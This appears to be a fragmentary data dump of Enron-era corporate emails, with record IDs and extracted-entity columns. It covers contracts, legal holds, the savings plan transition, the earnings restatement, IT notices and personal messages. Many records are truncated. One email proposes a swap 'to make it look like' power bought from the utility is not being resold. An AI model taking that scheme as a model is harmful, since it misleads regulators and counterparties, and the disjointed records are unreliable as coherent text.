Regarding costs, we have an approved work order for $650,000 which covers all 
the initial hardware, software, implementation costs and first year 
maintenance.  This cost does represent a very limited implementation with 
only 10 concurrent users, no customization except a few reports, and no 
electronic interfaces or data conversion.  The assumption is that initially 
the volume would be so low that an automated interface may not be cost 
justified, and the data would manually be loaded since it was low volume as 
well.  The on-going costs are estimated at approximately $100,000/year.  We 
did not perform a separate cost/benefit analysis as this was in the original 
cost of the Revenue Management RAROC.  Let me know if you have any other 
questions or there are open issues that we need to address prior to 
completing the contract.  We are hoping to get this signed and the project 
underway next week.  Thanks.",Caroline Steve Philippe Caminus Arthur Anderson,"650,000 approximately $100,000","Rod Enron Risk System Arthur Andersen Deliotte &Touche

Cool Site of the Day

 


The New York Review of Books may be a bit too pretentious for some, but it's 
more than worth plodding through for its literary value. The magazine's got a 
long list of contributors who've all made a huge mark on the world of letters 
- Norman Mailer, Saul Bellow and Truman Capote, to name a few. Another 
highlight is the caricatures gallery by the journal's artist, David Levine. 
And finally, for those looking to avoid online booksellers' ""book 
suggestions"" that are just thinly-veiled advertisements, you'll find a 
plethora of genuine recommendations here. Read on. www.nybooks.com

Fact of the Day

 


Poppycock comes from the Dutch pappekak, and it describes something that is 
nonsense or whose value is equivalent to its original meaning: soft dung. For

Joke of the Day

 Out of the Mouths of Babes


A first grade teacher collected well known proverbs. She gave each
child in her class the first half of a proverb and asked them to come 
up with the remainder of the proverb. Their insight may surprise you.

Better to be safe than....................Punch a 5th grader

It's always darkest before............... Daylight Savings

You can lead a horse to water but.........how?

Don't bite the hand that................. looks dirty

If you lie down with dogs, you'll.........stink in the morning

Happy the bride who.......................gets all the presents

Don't put off till tomorrow what..........you put on to go to bed

Children should be seen and not...........spanked or grounded

You get out of something what you.........see pictured on the box

And the favorite...

Better late than..........................pregnant

Fact of the Day

 


Long before one's box of Cap'n Crunch or Rice Krispies came with a plastic 
tchotchke, Kellogg's Corn Flakes ran the first breakfast cereal premium 
offer. In 1909, the Funny Jungleland Moving Pictures Booklet was available 
with the purchase of two packages of Kellogg's Corn Flakes. The offer ran for 
23 years. For more, click here.

1051,"Kim attached is the general job function and plan for the staff requested 
below.  This plan has been reviewed with the majority of the staff on the 
email above.

The end result will vary but generally this plan will allow the floor to 
create a pool of staff that will ensure the trading floor is well supported 
on the trading, scheduling, hourly and services areas from the core of our 
fundamentals group.  By using the spring and fall - of cycle staff we will 
also be able to better manage the core summer analyst rotations.

I'm looking forward to the orientation and training of this new talent and 
Thanks for you assistance in this matter.

Please ensure that the eight staff that we require in August come from the 
list the Kevin Presto has issued you.

1053,"Hello sunshine.  I haven't heard from you, I trust everything is okay.  I 
have sad news to report.  My neighbor died this morning. You remember the 
little neighbor who got burned, and no one told her that her father had lung 
cancer, well he expired.  Please pray for the family.  I feel so sorry for 
his wife.  I know I never have good news, and if you ever get tired of me 
telling you bad news just let me know.  The devil is so busy, I have to ask 
for help to fight him.  I really appreciate your willing ear. My other 
neighbor went to the emergency room Monday and they will keep her until 
today. She 
thought she was having a heart attack.  We do not know what is wrong with her 
she will go for test on next Thursday.  Help me pray for these families.  You 
know I love you.  I will talk to you later.  Tell all the Saints I said 
hello.

1063,"Attached for your review and comments is a draft of the Master Electric 
Services and Sales Agm we've been talking about.  As discussed with Mike, I 
used a combination of the Master Form that Mike has been circulating to the 
business teams... and Mike's version of the Home Depot draft.  I've also 
incorporated certain provisions that Wal-Mart asked to include in the gas 
contract that Marianne Castano drafted.  You will see a number of provisions 
bracketed and bold.  Pls give me your thoughts on those and
Wal-Mart does not like arbitration and we deleted it in the gas contract.  
Have talked with Bob Williams our Enron Corp litig expert and says we need to 
hold firm on keeping arbitration if at all possible.   Have kept arbitration 
in the draft.
Mike S. and Jeff, Wal-Mart has the following standard provision it likes to 
include:  ""Non-Interference:   In exercising EESI's rights herein, we shall 
not unreasonably interfere with your operations.""   Normally we avoid such 
broad provisions but we agreed to include in the draft gas contract and draft 
metering agreement.  I did not add this to the draft.  Thoughts?
MIke S. and Jeff, any problems with keeping the Mutual Indemnity, Walmart 
asked for indemnity in gas contract and we agreed to include one.
Mike S. and Jeff, any problems with Severability provision?
 Mike H. and Angela, do you want the Add Delete and Substitution provisions 
that are in the draft (same as HD),
Walmart asked that we add a provision saying we'll use comm. reas. efforts to 
mitigate Penalties in the Operational Change provision, I will add this to 
the next draft.

Pls advise who at the Desk this draft should go to.

Below are the clean version, the blackline against Mike's HD draft and the 
blackline against the Master form that Mike circulated to the business team 
and lawyers 6-4.

1068,"Since our department has grown, we have realized the need to add 3 new temporary IDs.  Following the instructions below, please add calendar access rights for EWS Legal Temp IDs 9, 10, and 11 (as show in blue below). While doing this, would you mind checking the other IDs as well to be sure they are listed.  When logging in temporaries we have discovered that some access rights work with some temp IDs, but not all.  Thank you!
================================
For Outlook users only!

Since we have migrated to Outlook, we have not been able to give calendar/e-mail access to the temporaries filling in for our department.  Apparently, the access rights we all had set up in Lotus Notes cannot be migrated to Outlook.  Thus, we need all attorneys and specialists to give access rights to all the department Temporary IDs as soon as possible.  You can control how much access you would like to give, and for what.  For example, you could give full revision access to your calendar and read-only for your e-mail or access only to your calendar and no access to your e-mail.  It's up to you.

Please give access to the following IDs:
EWS Legal Temp 1
EWS Legal Temp 2
EWS Legal Temp 3
EWS Legal Temp 4
EWS Legal Temp 5
EWS Legal Temp 6
Note:  Do not use-Temp 7 is not designated for our temporaries.
EWS Legal Temp 8
EWS Legal Temp 9
EWS Legal Temp 10
EWS Legal Temp 11

To set up access:
1.	Right click on ""Outlook Today"" at the top of the folders list (if your folders list is not visible, click on ""View"" and
	then ""Folder List"")

2.	Left Click on ""Properties"" at the bottom of the list that pops up

3.	Left click on the ""Permissions"" tab

4.	Left click on ""Add"".
	Type ""EWS""-the address list will stop on our temp IDs.
	Left click on one of the Temp ID you are adding, left click on the ""Add"" button.  Repeat for each ID.  (Be careful not
	to add EWS Temp ID 7.  This is not used for our temporaries.)
	Left Click ""OK""

5. 	You should now be back in the ""properties"" box.  Select the first ID you just added, hold down the ""Shift"" key, then
	left click all the other ID's.  With all IDs now selected and not holding the Shift key down, click in the boxes which
	access you would like to allow the temporaries to have.  (Note:  Do not select anything that has ""own"" or ""owner""
	in it as you are the owner.)  Left Click on ""Apply"", then ""OK"".

6.	Right click on your ""Calendar"" folder and repeat steps 2-5 above.

7.	[Optional].  To give access to e-mail or any other folders you may have, right click on that folder and repeat steps
	 2-5 above.

Regarding the Legal Temp IDs, these set-up instructions need to be completed only once. If your Assistant ever changes, these instructions will come in handy!
Thank you for your time and patience. ",,,EWS Legal Outlook Lotus EWS

As you know, Enron, its directors, and certain current and former officers are defendants in litigation in Federal and State court involving the LJM partnerships.

Enron has employed counsel and they will represent Enron and its interests in the litigation.

Under the Private Securities Litigation Reform Act, we are required to preserve documents that might be used in the litigation. 

Accordingly, our normal document destruction policies are suspended immediately and shall remain suspended until further notice.

Please retain all documents (which include handwritten notes, recordings, e-mails, and any other method of information recording) that in any way relate to the Company's related party transactions with LJM 1 and LJM 2, including, but not limited to, the formation of these partnerships, any transactions or discussions with the partnerships or its agents, and Enron's accounting for these transactions.

You should know that this document preservation requirement is a requirement of Federal law and you could be individually liable for civil and criminal penalties if you fail to follow these instructions.

You should know that Enron will defend these lawsuits vigorously.  In the meantime, you should not discuss matters related to the lawsuits with anyone other than the appropriate persons at Enron and its counsel.  

If you have any questions, please contact Jim Derrick at 713-853-5550.

Late on October 25th, we received information about a nonspecific threat to the Enron Center.  We communicated with law enforcement officials who found the threat unsubstantiated and without merit.  Nonetheless we take all threats seriously and have increased the security presence at the Enron Center still further.  

Once again, if you observe suspicious behavior, please call security at 3-6200.",,,the Enron Center

INTERNATIONAL FORUM 2002:  THE INTERNATIONAL CARTEL WORKSHOP 
JANUARY 31 - FEBRUARY 1, 2002 
THE PLAZA, NEW YORK 
The Section of Antitrust Law is pleased to invite you to our International Forum 2002:  The conference is a full two-day conference featuring enforcement officials from the United States, Canada, the European Commission, the United Kingdom and Australia, defense lawyers from six jurisdictions and plaintiffs lawyers from major cartel cases in the United States.  
The conference will be based on a hypothetical cartel case and will be conducted as demonstrations of various events in a major cartel case in several jurisdictions.  The first day's lunch will feature an enforcement roundtable with representatives of five jurisdictions discussing cartel enforcement and the second day's lunch will present a judicial roundtable featuring judges who have presided in cartel cases, civil and criminal.
For complete conference information click on this link http://www.abanet.org/antitrust/cartelagenda.pdf  or contact the Section of Antitrust at 312.988.5609.

Looks good to me.  I have a question/comment on #3.  When we have talked to
PP&L, it was understanding that if you are buying power from the utility, it
was a sole-serve type of arrangement (you couldn't buy power on the grid).
If this is the case, is there a way that another Enron affiliate or maybe
your wholesale group could perform a swap with the power or the financials
to make it look like we are not taking power from the utility and selling it
in the market?

In an effort to protect Enron's e-mail system from harmful viruses, the Global Messaging Team has implemented an inbound and outbound cluster of MAILSweeper servers. What does that mean to you, the user? All inbound and outbound Internet mail is passed through a set of servers that will scan each message for viruses, malicious code, business related-content and inappropriate content. Inbound Internet mail that contains the following attachment types will be quarantined (held for delivery): *.vbs, *.exe, *.com, *.bat, *.cmd. If you are the intended recipient of one of these e-mails, you will receive an automatic notification with instructions on how to get your legitimate e-mail released from quarantine.

We have taken these measures to protect our e-mail environment from harmful e-mail viruses. We believe that these protections will result in less down time for your e-mail, in the event that Enron gets hit with a virus or malicious code.",,,Enron the Global Messaging Team MAILSweeper

If you are a participant in the Enron Corp. Savings Plan, please read this very important message.

We understand that you are concerned about the timing of the move to a new Savings Plan administrator and the restricted access to your investment funds during the upcoming transition period scheduled to take place beginning at 3:00PM CST on October 26 and ending at 8:00AM CST on November 20.  

We have been working with Hewitt and Northern Trust since July.  We understand your concerns and are committed to making this transition period as short as possible without jeopardizing the reconciliation of both the Plan in total or your account in particular.  

Remember that the Enron Corp. Savings Plan is an investment vehicle for your long-term financial goals.  The Enron plan will continue to offer a variety of investment opportunities with different levels of risk.  

As always, we advise you to review your overall investment strategy and carefully weigh the potential earnings of each investment choice against its risk before making investment decisions that are aligned with your long-term financial plans and your risk tolerance. 

For that reason, it is critical that ALL trades among your investment funds be completed by 3:00 PM CST Friday, October 26 before the transition period begins.",,,Enron Corp. Savings Plan Savings Plan Hewitt and Northern Trust Enron

All Membership Rewards accounts were cancelled when American Express cancelled the Enron/American Express Corporate Cards.  To redeem Membership Rewards Points earned, the Corporate Card Account must be paid to a zero balance.  Upon paying the account  to a zero balance you have two options to redeem the points:

1)  Establish a Personal Card account with American Express and have the points that were accrued on the Corporate Card transferred to the Personal Card.  To apply for a Personal Card over the phone you can call 1-800-The-Card (843-2273).  Cardmembers must transfer Membership Rewards points to the new card by March 1, 2002.

2) If you do not have a Personal Card and do not want to establish a Personal Card, you should call the American Express Membership Rewards Redemption Line at 1-800-297-3276 and ask to speak with the Executive Consumer Relations Desk.  You should identify yourself as an Enron employee and request that your Membership Rewards be reinstated.  Reinstated points must be redeemed before March 1, 2002.

2.	You will then be prompted for your PIN number.  Since calling cards and pin numbers are not required to use this service, all users should respond by dialing 1-800-97-ENRON or 1-800-973-6766. 
3.	You will then be asked to enter your destination.  Please dial 0-800-97-Enron (800-973-6766) to reach Enron's corporate offices in Houston.
  
This procedure can only be used to call 800-97-Enron from WorldPhone International locations.  If you are calling from the U. S. or Canada, please continue to dial 1-800-97-ENRON.
  
If you have questions regarding commercial aspects of this agreement, please feel free to contact Tom Moore, GSS senior contract manager at 713-345-5552.  For technical issues, please contact Hasan Imam, ENW IT manager at 713-345-8525.

1107,"As everyone is aware, Peoples provided notification to Enron MW, L.L.C. of its desire for credit support or termination effective December 28th of the Master Physical Agreement between EMW and PGL.  Richard and I met with Raulie, Dave and Tim this morning to discuss the implications of the termination and our ability to continue to fulfill our obligations regarding the deals that are subject to the Master.  After much discussion, they (PGL) have agreed to delay any termination until either the end of January or February (they are going to discuss internally which makes more sense).  Therefore, unless a higher power overturns our agreement, PGL intends to issue a letter amending their previous notification/assurance letter.

This has been a tough couple of weeks.  I hope that these daily communications on new developments are helping you understand what's happening with our company.

Here's a rundown of events from last week:

	We executed a commitment letter with JPMorgan and Salomon Smith Barney that will provide us with additional secured credit lines worth $1 billion.  Our Northern Natural Gas Company and Transwestern Pipeline Company will support these assets.  We now have received a total of $4 billion in credit lines, which we will use to pay off short-term commercial debt and maintain liquidity.
	Our Board of Directors elected a new member to the Board - William Powers, Jr., the dean of The University of Texas School of Law in Austin, Texas.
-	The Board also established a Special Committee, to be chaired by Dean Powers, that will conduct an in-depth review of the transactions between Enron and entities connected to related parties.  The committee is authorized to take any actions it deems appropriate.
	The Securities & Exchange Commission (SEC) opened up a formal investigation into related party transactions that have been the subject of media reports and the subject of the SEC's formal inquiry.  As I've said before, we welcome this and look forward to working with the SEC to put this matter behind us.
      Moody's lowered our credit rating one level, from Baa1 to Baa2.  Standard & Poor's (S&P) lowered our credit rating one level, from BBB+ to BBB.  Fitch lowered our rating from BBB+ to BBB-.  All agency ratings are investment grade.

Even with what's happening with our company, we have kept running our business as usual, and here's few examples to show you that we are, indeed, doing just that:

	EnronOnline did 5,866 transactions with 302 counterparties on Friday.  Transaction counts remain higher than average.
	EES signed a three-year fixed price agreement with Home Depot to supply power to 115 of its stores in California and 68 stores across Texas.  EES also has exclusive rights to develop energy management proposals for all Home Depot facilities west of the Mississippi.
      EES also signed a three-year energy management agreement with Memorial Sloan-Kettering Cancer Center's four New York City facilities.

Serious issues have been raised in the media and investment community that have put our credibility and reputation as a company in question.  We're taking an introspective look at our business dealings, our core values and our organization as a whole.  We're doing everything we can to deal with the issues that are affecting our company.

And that's where you come in.  Look around you.  Look at the excellence that you and your team represents.  That's the reason we hired you - you're the best.  Now, more than ever, work for Enron and especially for each other.

Thank you for your continuing support of our company and each other.",,$1 billion $4 billion,JPMorgan Salomon Smith Barney Our Northern Natural Gas Company Transwestern Pipeline Company Our Board of Directors the Board - William Powers The University of Texas School of Law Special Committee Dean Powers Enron The Securities & Exchange Commission SEC Moody's Baa1 BBB EnronOnline EES Home Depot Memorial Sloan-Kettering Cancer Center's

Occupancy Guidebook To Enron Center South
You will find this handy guide on your desk; it contains information concerning the enhanced printer environment, the new easy access keyboards and telephony procedures.

NEC Monitors
The NEC monitors have an internal anti-glare screen to help reduce eye strain and eliminate the need to install an additional screen cover.  Additionally, an integrated speaker has been installed on one monitor for each desk.

Turret Users
An ""Alliance MX turret quick reference guide"" has been placed on your desk; this includes important information about the new features such as ""Caller ID"" and ""Voicemail Indication"".

Increased Information Access
There are many NEC 50"" Plasma screens installed on the 5th and 6th floors.  While many of these will be displaying information designed for the specific unit, others will be displaying various television channels.  The audio to these television channels can be accessed via any of your telephony equipment.  Here's how:

Ten audio channels have been set up for access from your either your Avaya telephone, Stentophon, or IPC Turret.  The channels have been defined on Page 15 of your Turret.  To access the audio from either your Avaya or Stentophon, simply dial the extensions shown in the table below:

You may notice the cellular phone coverage is not consistent across the floor, and some areas have virtually no coverage at all.  We are implementing a multi-network ""in-building"" system to provide consistent high quality service for the campus, keeping you in touch while you are on the move.  

Wireless LAN
The infrastructure to support Wireless LAN technology is in place and is being tested. We will be implementing multi level encryption and security to keep our intellectual property safe from eavesdroppers or hackers.

Amtel Replacement
As a move to provide a more flexible ""Plug n Play"" environment and to help with the reduced desk footprint, we have replaced the Amtel message boxes with Microsoft Exchange Instant Messaging. The Global Messaging Team is testing additional software products to provide some of the features not available with Exchange Instant Messaging; these include one-touch response keys, external LED display, and printing.

As one of the enhanced security measures we have recently employed, we will be checking employee badges at the entrance to the ballroom.  All employees will be required to present a valid Enron badge with a photo.  If you do not currently have a photo on your badge, please go to the badge office on the third floor of the Enron Building and have your photo added to your badge.  We also suggest allowing a bit more time in getting to the Hyatt and we request your patience, as these security measures may create some backup at the entrance to the ballroom.

Accessing the Meeting via Streaming Audio/Video
If you are a Houston-based employee and can't attend the meeting, or if you are located in London, Calgary, Toronto, Omaha, New York or Portland (ENA), you can access the live event at <http://home.enron/employeemeeting>.  Enron Europe employees will receive a follow-up message from their Public Relations team concerning online access to the meeting.

1139,"As some of you may know, I have been working with Lindon Chiu of the IT department to generate real time, hourly graphs for various California data (load, imports, temperature).  We now have the preliminary graphs, and they can be accessed at:

 http://fundamentals.dev.corp.enron.com/main.asp (not the same link as the main fundamentals page)
(click on ""Gas"", ""Testing"", and then ""Load and Temperature Charts"")

These are the premilinary graphs which pull data from the Portland West Power database, so they will include only the data available in the Portland tables .  The finalized versions will actually scrape the various data straight from their original souces (Cal ISO website, Bonneville website), which will make them more reliable.

Please look at the graphs, and tell me what changes you would like, if any.  I will pass them along to Lindon before he starts work on the finalized graphs, which will eventually be included in the ""Integrative Reporting System"" for the entire floor.

Also, please forward to anyone else you think would be interested in these graphs.

As a reminder, the WSCC outages graphs can still be accessed at the main fundamentals webpage under ""Gas"", ""Testing"", ""WSCC Outages"".  

Please e-mail me with any questions or concerns.  Thank you!

1140,"Hello Everyone, 

",,,
1141,"
Today we released additional information about our related party and off-balance sheet transactions.  We have made this information available both on our website and in a Form 8-K filing with the Securities and Exchange Commission (SEC).

The information provides further details about:

	-- the $1.2 billion charge to shareholders' equity announced in the third quarter and the transactions related to that charge;
	-- a restatement of prior years' financial statements to reflect this reduction in shareholders' equity, the consolidation of     three entities and prior year proposed audit adjustments and reclassifications;
	-- the Special Committee appointed by the Enron Board of Directors to review transactions between Enron and related parties; 
	-- the LJM limited partnerships, including a discussion of transactions between Enron and LJM entities; and
	-- transactions between Enron and other Enron employees.

This information addresses a number of concerns that have been raised by our shareholders and the SEC.  As our Board's new Special Committee continues its review of various matters, we will continue to cooperate fully with the SEC in its investigation, and we will continue to respond to investor requests so that they can evaluate, appreciate and appropriately value the strength of our core businesses.  

Restatement of Earnings

Based on information that we have recently obtained, Enron and its auditors determined that certain off-balance sheet entities should have been included in Enron's consolidated financial statements pursuant to generally accepted accounting principles.  As a result, Enron will restate its financial statements from 1997 to 2000 and for the first and second quarters of 2001.  These restatements have no material effect on Enron's current financial position.  Here are some details included in the filing:

Net income for each period will be impacted by the retroactive consolidation of Joint Energy Development Investments (JEDI) and Chewco beginning in November 1997, the consolidation of an LJM1 subsidiary for 1999 and 2000 and prior year proposed audit adjustments.  Enron's current assessment indicates that the restatement will include:

	-- a reduction of approximately $96 million in 1997
	-- a reduction of approximately $113 million in 1998
	-- a reduction of approximately $250 million in 1999 
	-- a reduction of approximately $132 million in 2000
	-- an increase of approximately $17 million for the first quarter of 2001 
	-- an increase of approximately $5 million for the second quarter of 2001
	-- a reduction of $17 million for the third quarter of 2001.  

The consolidation of JEDI and Chewco also will increase Enron's debt by approximately $711 million in 1997, $561 million in 1998, $685 million in 1999 and $628 million in 2000.

The restatement will have no material impact on Enron's reported earnings for the nine-month period ending September 2001.

You can obtain more detailed information on the items described above by accessing the Form 8-K filing at <http://www.enron.com/corp/sec/>.

We will continue to review our strategic, operational and financial position, and we will continue to keep you updated on any developments.",Chewco http://www.enron.com/corp/sec/,$1.2 billion approximately $96 million approximately $113 million approximately $250 million approximately $132 million approximately $17 million approximately $5 million $17 million approximately $711 million $561 million $685 million $628 million,the Securities and Exchange Commission SEC the Special Committee the Enron Board of Directors Enron LJM Board Special Committee Joint Energy Development Investments JEDI LJM1 Chewco
1142,"Hey there!  I went to jeep at lunch.  The guy is giving me a good price on
the car.  However, he is trying to screw me on the price of my car.

He is telling me that the price of the car purchased from the dealership is
as follows...

 Manuf price        $23,668
+sun roof-          $704.00
+destination charge $600.00
+ a few addl charges$364.00
Total price          $25,336


That is pretty consistent with what I show for the price.  Possibly taking
off a few of those fees but that is pretty minimal...

1146,"Jeff,

Lets make dinner plans to discuss this.....Just kidding.  While Scott was here, we arranged for him to be included in the Oct 29th Trading Track interviews.  This seems to be the best thing for him given that he really wants to become a trader.  Once in the program, he'll have 4 rotations (6 months each), some of these would likely be on the west desk.

Mike and I have talked and both agree that it makes good sense for Scott to join west gas given his experience in Portland.  However, the only hitch is that Mike cannot unilaterally decide to bring Scott to the desk.  He will need to negotiate this with the other desk heads and the program director.  This should not be an issue.

must respond with a non-binding indication of interest by 5:00 PM, March 15.  
If we are selected to go on to the next phase of the process, we will be 
scheduled for a 2 day data room visit.  These sessions will begin on or about 
March 20.  It is a fairly fast track deal.  REI wants binding offers by April 
20, with final execution of a definitive agreement in late April/early May.

The assets are being offered either as a total package, or in any subset(s), 
broken down as follows:
 Reliant Energy Gas Transmission and Mississippi River Transmission  (to be 
viewed together as a single asset)
 Reliant Energy Field Services (gathering and processing)
 Reliant Energy Arkla (LDC)
 Reliant Energy Minnegasco (LDC)

We will need to find a solution to the PUHCA problem if we seriously want to 
buy either the Minnegasco or Arkla LDC assets (this could be very 
difficult).  The transmission and the field service assets would be ""easier"" 
to own from that standpoint.  In any event, we may want to go to all the data 
rooms just to learn about these assets.

Bottom line, if our preliminary bids are good enough to get into the data 
room phase of this deal, we will need a lot of help from the operations 
side.  These assets start with field gathering & processing, and end with 
retail gas deliveries to the homeowner ... truly a ""stem to stern"" asset 
package.  I'll keep you up to date on our progress, but we should be thinking 
about the team we'd put in the data room, and on site visits, etc. if given 
the opportunity.

Thanks for responding to me on this item.  While you have public email

unsolicited emails simply because they are GISB Board members.  I will see
Miriam (AGA representative) next week respond to AGA that we are not in the
practice of providing Board member emails to other than Board members.  I
would be happy to forward his comments to the Board or have them posted for

month.  I truly enjoyed the informal setting of the dinner, providing my 
thoughts on energy related issues, and hearing the views of those who 
attended the dinner.  Hopefully, the dinner guests received some value for 
their attendance.

On another front, I hope everything went smooth for the big move, although I 
missed your participation at the lunch that Ken Lay had for me and others.  
It is clear that gas issues are on the back burner these days, and that 
electric related matters and e-commerce are just more daunting and 
interesting.  Of course, that is where the money--profit-- will be in the 
future.

On a more personal note, I wish you and Debbie the best, and hope your new

1157,"The following is an update on PGG earnings for the 2nd quarter and our ability
increase our EBIT for PGG from our last current estimate of 58 million to at
least 62 million.  I talked with Kirk Steven's this afternoon and after
looking at our preliminary closing estimates for power cost for May, our June
current estimate of power cost, and the amount of overview (25 million) we had
targeted for the second quarter here is what we concluded based upon the
assumption that prices for June do not continue to degrade from current levels
like they have over the last month.

Current Estimate Provided to Enron for Q2                   58  million
Power Cost & O&M Improvement > Overview               10  million
Catchup on Enron Allocations                                     (  3) million
Total EBIT                                                                    
65  million

There are two sensitivities to this estimate that could lower this number by a
combined 6.5 million.  

First we understand that we may be allocated charges for the Tomas transaction
that ran through the PGG books last year.  We reserved 1.8 million last year
and we understand the total charges from GATX could be as much as $5.1
million.  We did not include anything in our targets or plan for additional
charges since this transaction was originated in Houston.  

Second we have incurred $3.2 million in costs associated with supply chain
software associated with the sale of PGE to Sierra.  We will have to write-off
these costs in the second quarter since the software would only have value in
a peoplesoft system environment.  We have had good discussions with Bob Butz
about Enron covering these costs with some of the money they received from
Sierra to terminate the transaction.  We will need to resolve this in the 2nd
quarter or take the write-off which would reduce our EBIT.

In addition, as we have communicated before with you, we still have an open
long power position in June and all of the third quarter for reliability
purposes which will continue to cause our earnings to be volatile.  Recently
power curves in the west have been trading down but we would expect them to
rise as the warm weather comes on and loads in California increase.  There
have been some structural changes in the California market that could tend to
dampen the price curves for this summer.  

We will continue to keep you informed on what changes we are seeing as we go
through June in terms of meeting the 2nd Quarter adjusted current estimate
EBIT numbers discussed above.  If you have any questions or would like to
discuss this further feel free to call me at 503-464-8982.","Kirk Steven's Tomas Bob Butz

Director
Enron Transportation Services

Dear Mr. Hyatt:

Powerful new forces are transforming the North American gas and power
industry, bringing considerable volatility and uncertainty to investment
and strategy. Questions relating to prices, security, geopolitics, the
global economy, and environmental concerns are forcing reconsideration
of basic assumptions and plans.

To address these questions and concerns, Cambridge Energy Research
Associates (CERA) announces a timely new multiclient study, ""New
Realities, New Risks: North American Power and Gas 2020.""

In an online interview CERA Senior Director Lawrence J. Makovich
presents a brief overview of major issues to be addressed in the study.
To hear more information about the study, please access the interview on
our website at http://www.cera.com/mc?c=68386&p=1044 .

Using CERA's scenario planning methodology, ""New Realities, New Risks""
will present plausible alternate paths to the future of power and gas
markets in North America over the next 20 years. The Study will provide
useful tools for evaluating corporate strategies and investments as well
as an integrated assessment of gas and power market analyses. 

The study will address key issues including
*What levels of gas and power prices are sustainable?
*How will the current wave of power plant and gas pipeline
infrastructure development shift North American energy dynamics?
*What opportunities, risks and challenges face those involved in the
industry?
*How will technological developments affect future gas and power
markets?
*Will the role of government expand or contract in the energy industry?
*What will be the cost and value of increased energy security?
*Who will be the winners and losers in each scenario?

For complete details of the study, including deliverables and proposed
study content, please visit our website at
http://www.cera.com/offerings/details/1,1504,CID2299,00.html.

In the traditional CERA format, the study will start with a kick-off
workshop. Exclusively hosted for study participants(*), the kick-off
workshop will take place in early January at a location to be announced.

</TABLE>One of the most meaningful features to appear in The New 
York Times and on NYTimes.com is Portraits of Grief. This 
feature first began running on September 15 and presented 
brief profiles of World Trade Center victims. On December 
31 the final daily edition of Portraits of Grief appeared 
in The New York Times newspaper. A book will be published 
this year, and the feature will continue to appear from 
time to time, as more names become known and more families 
agree to interviews.<p>


In the meantime, we invite you to visit the Web site to 
see a complete collection of Portraits of Grief, 
alphabetized and listed by day. This archive represents 
all the Portraits published to date. They will remain at 
NYTimes.com indefinitely.<br>

Another recent special feature has been the multimedia 
photo essay. We have already talked here about the essays 
done by Vincent Laforet and James Hill. I would now like 
to direct your attention to the newest, this one by Times 
staff photographer Ruth Fremson about the women in 
Afghanistan. The essay features a very strong audio 
commentary, which makes the point that not all the women 
feel the same about the head-to-toe veil they were 
required to wear under the Taliban's rule: in fact, many 
are very comfortable dressed as they are.

We have enjoyed participating in almost daily 
""conversations"" with correspondents of The New York Times. 
In these unstructured talks, each correspondent provides 
information not only about the news he or she is covering, 
but on what life is like in the particular place he or she 
is located. There are over 50 discussions now available 
for listening in audio format.

The Winter Olympics games at Salt Lake City begin soon and 
NYTimes.com already has started covering this event. Our 
Olympics section covers security concerns, athlete 
profiles and an interactive map of the torch relay. 
Special e-mail updates are now available, and include 
periodic countdown reports and details of the torch run, 
athlete profiles and event previews. When the games begin 
on Feb. 8, we'll send daily dispatches with event results 
and exclusive ""postcards"" from Salt Lake City by Times 
sports reporter George Vecsey.

for upcoming standardized tests in ways that are fun and 
interactive. Every weekday there's a focus on a different 
word -- its definition and an example of its use in the 
context of a recent Times article; and students can then 
test their understanding online with the day's analogy or 
sentence completion question.

1189,"Questar Plans WY Storage Project, Pipeline Hub 
Questar Pipeline launched a major pipeline expansion initiative Tuesday in conjunction with plans announced recently to move forward with the eastern portion of its Southern Trails Pipeline to California and in response to strong demand for capacity on several other downstream pipelines, particularly Kern River. Questar also said it is moving forward with plans to build the Rocky Mountain region's first high deliverability salt cavern storage operation, and will attempt to turn its existing pipeline system into a market hub. 
The company is holding three open seasons, including one for the southwest Wyoming storage project, another for a northern pipeline expansion and a third for a southern mainline expansion. 
""We're moving forward with plans to make Questar Pipeline a major trading hub,"" said Questar President Keith O. Rattie during a conference call on the company's strong first quarter financial results. ""Our system already has many of the attributes of a major hub: abundant supply, multiple pipeline interconnections and abundant storage. We're moving ahead with plans to provide parking and loaning, no-notice balancing, wheeling and exchange, etc., which together will increase liquidity and facilitate trading and transportation on and between Questar and the other Rockies export pipes."" In addition, the company is expecting to add large amounts of receipt and delivery capacity at multiple points along its system. 
An expansion of its northern system would provide additional deliveries to LDC affiliate Questar Gas at Wasatch Front (up to 180,000 Dth/d is expected), Kern River at Muddy Creek or Painter (potentially 110,000 Dth/d), Northwest Pipeline at South Lake (30,000 Dth/d), and Wyoming Interstate Company, Overthrust Pipeline, Colorado Interstate Gas Company and Williams Central (50,000 Dth/d deliveries and up to 200,000 Dth/d of receipts at Wamsutter). The exact size of the project will be determined after the open season, which closes May 18. 
The southern system expansion will provide additional capacity from northern and southern receipt points to Kern River (ML104) at Elberta (potentially 300,000-400,000 Dth/d), TransColorado at Greasewood (40,000-60,000 Dth/d), Northwest Pipeline at Red Wash (80,000 Dth/d) and Questar Gas at the Wasatch Front. The transportation charges are as follows: reservation charge is $5.28804/Dth/month, the usage charge is $0.00267/Dth, the 100% load factor rate is $0.17652/Dth, the ACA charge is $0.00219/Dth and the fuel reimbursement charge is 0.8 %. Both projects are expected to be in service by Nov. 1, 2002. 
""There are a lot of customers that have signed up for capacity on other pipelines that are interested in getting gas supplies to those pipelines,"" said Alan Allred, vice president of business development for Questar Pipeline. ""There also are a lot of producers who are developing new supplies and are interested in getting their supplies moved. Questar Pipeline is fortunate to sit right in the middle of the Rockies in this producing area with growing production and also to be interconnected to most of the major pipelines in the West. We've seen open seasons on Kern River, Northwest Pipeline and CIG for its new pipeline (Ruby) going to California. All of that has prompted a lot of interest in moving gas across our system. 
""With the current [high] prices for gas and [strong] demand for gas, I think every available drilling rig we know of in the various basins is producing,"" he added. ""Certainly the Powder River [Basin] is producing a lot. We have the Emory coal-seam in Utah that's producing a lot of gas. There's drilling going on all around our pipeline: the Jonah area, the Mesa-Pinedale areas. And on the other end, there's a lot of demand in California."" He also noted there are multiple gas-fired power plants being constructed around Denver and in Wyoming, Utah, Nevada and in California, all of which could be served by Questar's pipeline and its new high-deliverability storage project. 
Questar's Rattie said the Wyoming Salt Cavern Storage Project is expected to be ready for service in June 2004, but partial service could be ready in 2003. The project, which will be located in Uinta County, WY, will include four 3.5 Bcf salt caverns, each capable of up to 12 cycles per year. ""That is ideal for peaking power and other flexible services,"" he said. ""This will make high deliverability multi-cycle, salt-based storage available for the first time for customers connected to the long-haul pipes out of the Rockies."" 
